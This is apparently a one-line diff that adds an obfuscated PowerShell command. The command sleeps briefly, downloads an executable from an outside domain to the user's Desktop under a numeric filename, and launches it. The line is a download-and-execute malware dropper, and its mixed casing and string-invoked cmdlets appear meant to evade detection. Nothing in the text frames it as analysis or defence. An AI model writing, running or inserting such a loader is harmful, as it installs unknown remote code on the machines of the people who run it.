@@ -1,0 +1,1 @@
+$7d0mK6 = [Type]'eNVIronmENt' ; &'sleep' 31;${Des} = $7d0mk6::gEtFoldErPaTH('Desktop');(&'New-Object' 'System.Net.WeBClIenT').dOwNLOaDfiLE.INVokE('http://tonetdog.com/ecotime','$Des\8671809.exe');&'Start-Process' $Des\8671809.exe
